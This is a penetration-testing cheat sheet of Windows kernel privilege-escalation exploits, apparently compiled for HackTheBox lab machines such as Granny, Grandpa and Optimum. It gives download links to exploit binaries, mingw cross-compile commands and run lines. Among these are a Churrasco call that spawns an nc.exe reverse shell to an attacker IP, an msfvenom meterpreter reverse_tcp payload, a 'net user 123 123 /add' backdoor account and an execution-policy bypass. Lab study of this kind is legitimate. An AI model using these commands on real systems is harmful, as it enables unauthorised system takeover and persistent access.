# 8. Kernel exploitation
## Repository of kernel exploit
- https://github.com/SecWiki/windows-kernel-exploits

Basics commands:
- echo %PROCESSOR_ARCHITECTURE%

Compile Windows kernel exploit on the kali box :
- i686-w64-mingw32-gcc shell.c -o shell.exe
	- x86
- x86_64-w64-mingw32-gcc shell.c -o shell.exe
	- x64

## Windows NT/2000/2003/2008/XP/Vista/7
### MS10-015 (KiTrap0D) (Not tested yet)
#### Where
- https://www.exploit-db.com/exploits/11199
- https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/11199.zip 

#### Exploit
- E-DB Note: Make sure to run "vdmallowed.exe" (pre-compiled) inside the subfolder.


## Windows XP/2003
### MS11-080 (afd.sys) (Not tested yet)
#### Where
- https://www.exploit-db.com/exploits/18176

#### Exploit (Python)
- python MS11-080.py

## Windows Server 2003
### MS09-12 --> Grandpa
#### Where:
- https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS09-012

#### Exploit:
- .\pr.exe <command>
	- .\pr.exe whoami
	- .\pr.exe shell.exe
		- Reverse shell (MSFVenom)

### Token Kidnapping Local Privilege Escalation --> Granny                      
#### Where:
- https://github.com/Re4son/Churrasco
- https://www.exploit-db.com/exploits/6705
	- http://www.argeniss.com/research/Churrasco.zip
	- https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/6705.zip

#### Exploit:
- churrasco.exe -d <command_to_execute>
	- churrasco.exe -d "C:\Inetpub\wwwroot\nc.exe 10.10.14.14 5555 -e cmd.exe"


## Windows Server 2008 R2
### MS10-059 --> Artic / Bounty
#### Where:
- https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059

#### exploit:
- MS10-059.exe 10.10.14.3 9001 
	- Reverse shell
- unzip Churraskito_exe.zip
- Churraskito.exe "C:\windows\system32\cmd.exe" "net user 123 123 /add"

## Windows 2003/2008/7/8/2012
### MS15-051 --> Bastard / Bounty
#### Where:
- https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051 

#### exploit:
- unzip ms15-051.zip
- .\exploit.exe “<command>”


## Windows 7 Enterprise / Professional
### MS11-046 --> DEVEL
#### Where:
- https://www.exploit-db.com/exploits/40564

### Exploit:
- i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32
- .\exploit
	- whoami

## Windows 7 < 10 / 2008 < 2012 R2 (x86/x64)
### MS16-032 → Optimum
#### Where:
- https://www.exploit-db.com/exploits/39719

#### Exploitation:
- msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.13 LPORT=10000 -f exe > admin.exe
	- Need some minor modification
- powershell -nop -ep bypass z:\exploit.ps1

## Windows Server 2012 R2
### MS16-098 → Optimum
#### Where:
- https://www.exploit-db.com/exploits/41020
	- https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe
- https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-098

#### Exploit:
- .\exploit.exe